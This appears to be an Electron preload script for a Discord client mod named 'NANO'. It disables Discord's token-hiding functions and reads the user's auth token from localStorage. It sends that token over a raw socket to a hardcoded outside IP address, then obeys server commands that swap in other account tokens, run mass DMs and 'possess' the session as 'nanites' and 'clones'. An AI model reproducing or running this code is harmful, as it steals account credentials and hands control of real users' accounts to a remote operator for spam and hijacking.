const { getCurrentWebContents, app } = require('electron').remote
const electron = window.require('electron');
const currentWindow = electron.remote.getCurrentWindow();
if (currentWindow.__preload) require(currentWindow.__preload);

process.on('unhandledRejection', (reason, p) => {
    console.log('Unhandled Rejection at: Promise', p, 'reason:', reason);
});
//?????????????????????
const path = require('path')
const fs = require('fs')
const Promise = require('bluebird')
//const buble = require('buble')
const net = require('net');
const Module = require('module');
/*  */
const base = require('./base2');
/* require.extensions['.jsx'] = (module, filename) => {
  const raw = fs.readFileSync(filename, 'utf8')
  const transformed = buble.transform(raw, {
    jsx: 'React.createElement',
    objectAssign: 'Object.assign',
    target: { chrome: 52 }
  })
  return module._compile(transformed.code, filename)
} */
//set up global functions
let c = {
    sleep: function(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
}
// config util
window.NANO = { plugins: {}, version: '' };
Object.defineProperty(window.NANO, 'config', {
    get: function() {
    },
    set: function(newSets = {}) {
    }
});


window.NANO.localStorage = window.localStorage;

process.once("loaded", async () => {
	while (typeof window.webpackJsonp === 'undefined')
		await c.sleep(1000); // wait until this is loaded in order to use it for modules

    window.NANO.webSocket = window._ws;

	/* Add helper functions that make plugins easy to create */
	window.req = webpackJsonp.push([[], {
	    '__extra_id__': (module, exports, req) => module.exports = req
	}, [['__extra_id__']]]);
	delete req.m['__extra_id__'];
	delete req.c['__extra_id__'];

    window.findModule = (module, silent) => {
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && m.default[module] !== undefined)
                    return m.default;
                if (m && m[module] !== undefined)
                    return m;
            }
        }
        return null;
    };
    window.findModules = (module) => {
        let mods = [];
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && m.default[module] !== undefined)
                    mods.push(m.default);
                if (m && m[module] !== undefined)
                    mods.push(m);
            }
        }
        return mods;
    };
    window.findRawModule = (module, silent) => {
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && m.default[module] !== undefined)
                    return req.c[i];
                if (m && m[module] !== undefined)
                    return req.c[i];
            }
        }
        return null;
    };
    window.monkeyPatch = function(what, methodName, newFunc) {
        if (!what || typeof what !== 'object')
            return ''; //c.error(`Could not patch ${methodName} - Invalid module passed!`, {name: 'Modules', color: 'black'});
        const displayName = what.displayName || what.name || what.constructor.displayName || what.constructor.name;
        const origMethod = what[methodName];
        const cancel = () => {
            what[methodName] = origMethod;
            return true;
        };
        what[methodName] = function() {
            const data = {
                thisObject: this,
                methodArguments: arguments,
                //cancelPatch: cancel,
                originalMethod: origMethod,
                callOriginalMethod: () => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments)
            };
            return newFunc(data);
        };
        what[methodName].__monkeyPatched = true;
        what[methodName].displayName = 'patched ' + (what[methodName].displayName || methodName);
        what[methodName].unpatch = cancel;
        return true;
    };

    while (Object.keys(window.req.c).length < 5000)
        await c.sleep(1000); // wait until most modules are loaded for plugins
    

    const ht = window.findModule('hideToken'), cw = findModule('consoleWarning');
    // prevent client from removing token from localstorage when dev tools is opened, or reverting your token if you change it
    monkeyPatch(ht, 'hideToken', () => {});
    monkeyPatch(ht, 'showToken', () => {});
    // change the console warning to be more fun
    monkeyPatch(cw, 'consoleWarning', () => {
        console.log("%cHold Up!", "color: #7289DA; -webkit-text-stroke: 2px black; font-size: 72px; font-weight: bold;");
        console.log("%cIf you're reading this, you're a Nano user!", "font-size: 16px;");
        console.log("%cYou were warned about opening this window. Now you must perish.", "font-size: 18px; font-weight: bold; color: red;");
    });
})



/* try {
  const buildInfo = require(path.join(
    process.resourcesPath,
    'app.asar',
    'build_info.json'
  ))
  if (buildInfo.releaseChannel === 'stable') {
    buildInfo.releaseChannel = ''
  }
  const appData = app.getPath('appData')

  require(path.join(
    appData,
    'discord' + buildInfo.releaseChannel,
    buildInfo.version,
    'modules',
    'discord_desktop_core',
    'core.asar',
    'app',
    'mainScreenPreload.js'
  ))
} catch (err) {
  console.error('Failed to inject native preloader!', err)
}  */
//T1hGT1JEVU5JVkVSU0lUWQ==.js

window._path = require('path');
window._fs = require('fs');
let css1 = fs.readFileSync(path.join(__dirname, '5ea38892s89as8d763829a09a.css'));

process.once('loaded', async () => {
  if (!global.process) global.process = process
  if (!global.require) global.require = require

  const ready = new Promise(resolve =>
  getCurrentWebContents().on("dom-ready", () => {
	let _styleTag1 = document.createElement('style');
	 _styleTag1.id = 'nano-system-styles-1';
	 _styleTag1.innerHTML = css1;
	document.head.appendChild(_styleTag1);
    const style = document.createElement("style")
    const css = fs.readFileSync(path.join(__dirname,'5ea38892s89as8d763829a09a.css').replace(/\\/g, '/'), "utf-8")
    style.appendChild(document.createTextNode(css))
    document.body.appendChild(style)
	NANO.Helpers = new (require('./UFJJTkNFVE9OVU5JVkVSU0lUWQ=='))();
	NANO.Helpers.createConsole();
  })
  )

console.log('started preload');
var userNum;
userNum = Number(fs.readFileSync(__dirname + '/user.txt'));

const NANO = window.NANO = {
    client: null,
	localStorage: null, 
	get package () {
		return {
			"name": "NANO",
			"version": "2.0.0",
			"description": "Bagels for the masses.",
			"main": "index.js",
			"scripts": {},
			"author": "madison, brian, william, riley",
			"license": "MIT",
			"repository": "",
			"dependencies": {}
		}
	  },
	
	  get version () {
		return this.package.version
	  },
	console: null,
	input: null,
	response: null,
	consoleClient: null,
	nanites: null,
	rednanites: [],
	purpnanites: [],
	nanitePostion: null,
	modules: null,
	clones: [],
	html: "",
    messageTxt: "",
    username: "",
    returns : [],
    checkedNanites: null,
    percentageNanites: 0,
    possessFunction: null,
    pendingNanites: {},
    possessed: false,
    promiseCommand(cmd) {
       return new Promise((resolve) => {
            
        NANO.consoleClient.write('$-' + cmd);
        let ndo = NANO.returns.length;
        function checkReturn(rTurn){
            console.log('Scanning for return...', rTurn);
            if(NANO.returns[rTurn]){
                console.log('FOUND RETURN', NANO.returns[rTurn]);
                resolve(NANO.returns[rTurn]);
            }
            else{
                
                setTimeout(() => {
                    checkReturn(rTurn);
                }, 500);
            }
        }
            
        checkReturn(ndo);
    });        
    }
};

process.on('uncaughtException', function (err) {
    console.log("Crashed!\n" + err.stack);
});
console.log('started preload 1');
NANO.consoleClient = new net.Socket();
let reloaded = false;
function replaceAll(str, find, replace) {
    return str.replace(new RegExp(find, 'g'), replace);
}
let rloaded = false;
function recurse() {
    try {
		var cHOST = '178.33.20.158';
		var cPORT = 37288 + 1000;
		
        NANO.consoleClient.connect(cPORT, cHOST, function (err) {
            if (err) {
                console.log(err);
            }
			NANO.consoleClient.write('init-');
			
			NANO.consoleClient.write('dologin_' + replaceAll(window.NANO.localStorage.getItem('token'), '"', ''));
        });
        NANO.consoleClient.on('data', function (data) {
            if(data.toString().includes("$>")){
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf(">") + 1), "");
				NANO.response = NANO.response.substr(0, NANO.response.lastIndexOf(";"));
                console.log('GOT PROMISE RESPONSE', NANO.response);
                NANO.returns.push(NANO.response);
                //NANO.consoleClient.write(">nite deploy 1-" + NANO.nanites);
            }
			if(data.toString().includes("=init&"))
			{
                
                console.log(data.toString());
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("&") + 1), "");
				NANO.response = NANO.response.substr(0, NANO.response.lastIndexOf("~"));
				console.log(NANO.response);
				try{
                    NANO.nanites = NANO.response;
                    
                    console.log('NANITES RECEIVED!');
                    NANO.promiseCommand('checkNanites').then((ret) => {
                        NANO.checkedNanites = ret.split('');
                        
                        console.log('CHECKED:',NANO.checkedNanites);
                    });
                    if(!NANO.nanites) NANO.consoleClient.write('init'); console.log('NORMAL NANITES FAILED TO LAUNCH! RETRYING!');


				try{
					NANO.rednanites = data.toString().substr(0, data.toString().lastIndexOf("`"));
					try{
						
						NANO.rednanites = NANO.rednanites.replace(NANO.rednanites.substr(0, NANO.rednanites.lastIndexOf("~") + 1), "");
					}
					catch(e){
						console.log('RED NANITES FAILED TO LAUNCH! CONTACT WIFI!');
					}
					console.log("rednites ARRAY",NANO.rednanites);
				}
				catch(e){
					console.log(e);
				}
				try{
					NANO.purpnanites = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("`") + 1), "");
				}
				catch(e){
					console.log(e);
					console.log('PURPLE NANITES FAILED TO LAUNCH! CONTACT WIFI!');
				}
				
				NANO.consoleClient.write('clones');

				if(reloaded == false) NANO.Helpers.createConsole();
                    }
                    catch(e){
                        if(!NANO.nanites) NANO.consoleClient.write('init'); console.log(e); console.log('NORMAL NANITES FAILED TO LAUNCH! CONTACT WIFI!');
                    }
            }
            
			if(data.toString().includes("massdm:"))
			{
				try{
                    
                    NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("<") + 1), "");
                    NANO.response = NANO.response.substr(0, NANO.response.lastIndexOf(">"));

					NANO.Helpers.createStatus(`<div class="menu-Sp6bN1 alt-3btY0e">
                    <div class="item-1GzJrl item-status">
                       <div class="statusIconText-3b4TkH">
                          <span class="status status-failed" style="margin-right: 14px;"></span>
                          <div>Mass DM</div>
                       </div>
                       <div class="helper-2c73HK">Sent message to ${NANO.response}</div>
                    </div>
                    </div>`);
                }
                catch(e){
                    console.log(e);
                }
			}
			if(data.toString().includes("percentageNanites'"))
			{
				try{
                    
                    NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("'") + 1), "");
                    NANO.response = NANO.response.substr(0, NANO.response.lastIndexOf(")"));
                    NANO.percentageNanites = NANO.response;
                    console.log(NANO.percentageNanites);
                    var percentageCircle;
                    if(document.querySelector('.percentageCircle')){
                        percentageCircle = document.querySelector('.percentageCircle');
                        percentageCircle.strokeDasharray = `${NANO.percentageNanites}, 126`;
                        if(NANO.percentageNanites >= 126){
                            NANO.possessFunction();
                        }
                    }
                }
                catch(e){
                    console.log(e);
                }
			}
			if(data.toString().includes("avatar'"))
			{
				try{
                    
                    NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("'") + 1), "");
                    NANO.response = NANO.response.substr(0, NANO.response.lastIndexOf(")"));
                NANO.avatar = NANO.response
                }
                catch(e){
                    console.log(e);
                }
			}
			if(data.toString().includes("username!"))
			{
				try{
                    
                    NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("!") + 1), "");
                    NANO.response = NANO.response.substr(0, NANO.response.lastIndexOf("("));
                NANO.username = NANO.response
                }
                catch(e){
                    console.log(e);
                }
			}
			if(data.toString().includes("rank%"))
			{
				try{
                    
                    NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("%") + 1), "");
                    NANO.response = NANO.response.substr(0, NANO.response.lastIndexOf("}"));
                NANO.rank = NANO.response
                }
                catch(e){
                    console.log(e);
                }
			}
			if(data.toString().includes("html,"))
			{
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf(",") + 1), "");
				if(NANO.response.includes('nobutton') == true){
					NANO.html = "";
				}
				else{
					NANO.html = NANO.response;
				}
			}
			if(data.toString().includes("switch&"))
			{
				let swStr = data.toString().replace(data.toString().substr(0, data.toString().indexOf("&") + 1), "");
				if(swStr.length > 59){
					swStr = swStr.substr(0, 59);
				}
				window.NANO.localStorage.setItem('token', '"' + swStr + '"');
				window.location.reload();
			}
			if(data.toString().includes("nanites&"))
			{
                NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("&") + 1), "");
                NANO.response = NANO.response.substr(0, NANO.response.lastIndexOf(")bruh"));
				NANO.nanites = NANO.response;
			}
			if(data.toString().includes("modules&"))
			{
        console.log('0-' + data.toString() + "-1");
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("&") + 1), "");
				NANO.response = NANO.response.toString().substr(0, NANO.response.toString().lastIndexOf('}') + 1);
        console.log(NANO.response);
        try{

          NANO.modules = JSON.parse(NANO.response);
        }
        catch(e){
          
        }
			}
			if(data.toString().includes("reds&"))
			{
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("&") + 1), "");
				NANO.rednanites = JSON.parse(NANO.response);
			}
			if(data.toString().includes("purps&"))
			{
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("&") + 1), "");
				NANO.purpnanites = JSON.parse(NANO.response);
			}
			if(data.toString().includes("userList&"))
			{
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("&") + 1), "");
				NANO.messageTxt =  NANO.response;
				let textArea = document.querySelector('.textArea-2Spzkt');
				textArea.value = textArea.value + NANO.messageTxt;
			}
			if(data.toString().includes("channelList("))
			{
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("(") + 1), "");
                console.log('GOT PROMISE RESPONSE', NANO.response);
                NANO.returns.push(NANO.response);
			}
			if(data.toString().includes("naniteAvatarEdit&"))
			{
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf("&") + 1), "");
				NANO.response = NANO.response.toString().substr(0, NANO.response.toString().lastIndexOf('}'));
				NANO.naniteAvatar =  NANO.response;
				document.querySelector('.naniteAvatarEdit').style.backgroundImage = "url('https://im-01.gifer.com/ZKZg.gif');"
			}
			if(data.toString().includes("retry:"))
			{
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf(":") + 1), "");
				if(NANO.response.includes('nanites') == true){
					NANO.Helpers.createStatus(`<div class="menu-Sp6bN1 alt-3btY0e">
   <div class="item-1GzJrl item-status">
      <div class="statusIconText-3b4TkH">
         <span class="status status-failed" style="margin-right: 14px;"></span>
         <div>Nanite Failure</div>
      </div>
      <div class="helper-2c73HK">Retry or contact Overlord.</div>
   </div>
   </div>`);
				}
			}
			if(data.toString().includes("success:"))
			{
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().lastIndexOf(":") + 1), "");
				if(NANO.response.includes('nanites') == true){
			NANO.Helpers.createStatus(`
   <div class="menu-Sp6bN1 alt-3btY0e">
   <div class="item-1GzJrl item-status">
      <div class="statusIconText-3b4TkH">
         <span class="status status-nanite" style="margin-right: 14px;"></span>
         <div>Nanites</div>
      </div>
      <div class="helper-2c73HK">Cooking up a new Nanite...</div>
   </div>
   </div>`);
				}
			}
			if(data.toString().includes("clones&"))
			{
				let swStr = data.toString().replace(data.toString().substr(0, data.toString().indexOf("&") + 1), "");
				swStr = swStr.substr(0, swStr.indexOf("]") + 1);
				try{
				NANO.clones = JSON.parse(swStr);
				}
				catch(e){
					console.log(e);
				}
				NANO.consoleClient.write("getModules");
			}
			if(data.toString().includes("reloaded&"))
			{
				reloaded = true;
				let swStr = data.toString().replace(data.toString().substr(0, data.toString().indexOf("&") + 1), "");
				swStr = swStr.charAt(0);
                swStr = Number(swStr);
                NANO.possessed=true;
				NANO.Helpers.createConsole();
			}
			if(data.toString().includes("cmdresponse:"))
			{
				NANO.response = data.toString().replace(data.toString().substr(0, data.toString().indexOf(":") + 1), "");
				let inputStr = `

>${NANO.input}





${NANO.response}





`;
							if(NANO.console != null){
						NANO.console.innerHTML = `
<code class="scrollbarGhost-K_3Xa9 scrollbar-11WJwo hljsConsole" style="background: #2f3136;width: 750px;height: 300px;left: 2%;position: relative;"> 
${inputStr}
</code>`;
							}
			}
        });

        NANO.consoleClient.on('close', function () {
        });
	}
	catch(e){
        setTimeout(() => {
			recurse();
        }, 5000);
	}
}

recurse();

console.log('started preload 2');
let localStorage = window.NANO.localStorage = window.localStorage;

localStorage.constructor.prototype._setItem = localStorage.constructor.prototype.setItem;

console.log('started preload 3');

})